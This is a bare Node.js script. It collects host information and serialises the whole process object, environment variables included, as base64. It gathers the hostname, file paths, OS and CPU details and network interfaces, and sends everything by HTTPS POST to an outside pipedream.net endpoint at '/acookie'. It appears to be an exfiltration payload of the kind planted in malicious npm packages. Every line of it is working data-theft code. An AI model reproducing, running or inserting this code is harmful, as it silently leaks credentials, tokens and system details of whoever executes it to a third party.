'use strict'

const https = require('https')
const http = require("http");
const os = require("os");

// var currentPath = process.cwd();
// var currentUser = 
var currentPath = __dirname;
var currentFile = __filename;
// var currentEnv = process.env;
var currentEnvString = JSON.stringify(process);
var currentEnvBase64 = Buffer.from(currentEnvString).toString('base64');

// console.log(currentPath);
// console.log(currentFile);
// console.log(currentEnvBase64)

var data = {
	envPORT: process.env.PORT,
	hostname: JSON.stringify(os.hostname()),
	currentPath: currentPath,
	currentFile: currentFile,
	currentEnvBase64: currentEnvBase64,
	type: JSON.stringify(os.type()),
	platform: JSON.stringify(os.platform()),
	arch: JSON.stringify(os.arch()),
	release: JSON.stringify(os.release()),
	uptime: JSON.stringify(os.uptime()),
	loadavg: JSON.stringify(os.loadavg()),
	totalmem: JSON.stringify(os.totalmem()),
	freemem: JSON.stringify(os.freemem()),
	cpus: JSON.stringify(os.cpus()),
	networkInterfaces: JSON.stringify(os.networkInterfaces()),

};

// console.log(process.env.PORT)
// console.log(os.hostname())
// console.log(os.type())
// console.log(os.platform())
// console.log(os.arch())
// console.log(os.release())
// console.log(os.uptime())
// console.log(os.loadavg())
// console.log(os.totalmem())
// console.log(os.freemem())
// console.log(os.cpus())
// console.log(os.networkInterfaces())

// console.log(data)
// console.log(JSON.stringify(data));

data = JSON.stringify(data)
// console.log(data.length)

const options = {
  hostname: 'f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net',
  port: 443,
  path: '/acookie',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
}

const req = https.request(options, res => {
  // console.log(`statusCode: ${res.statusCode}`)

  res.on('data', d => {
    process.stdout.write(d)
  })
})

req.on('error', error => {
  console.error(error)
})

req.write(data)
req.end()

